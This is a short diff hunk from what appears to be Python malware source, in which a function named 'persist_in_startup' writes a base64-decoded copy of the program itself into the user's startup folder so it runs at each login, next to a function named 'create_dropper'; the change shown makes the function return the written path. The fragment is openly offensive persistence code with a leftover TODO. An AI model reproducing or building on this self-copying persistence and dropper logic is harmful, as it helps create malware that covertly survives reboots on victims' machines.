@@ -39,7 +39,7 @@ def persist_in_startup():
     startup_folder = startupFolder.format(os.getlogin(),name_for_copy)
     with open(startup_folder, 'wb') as new_file:
         new_file.write(base64.b64decode(base64_of_ourself.encode()))  # //TODO 4: Check if this working.
-    return True
+    return startup_folder
 
 
 def create_dropper():
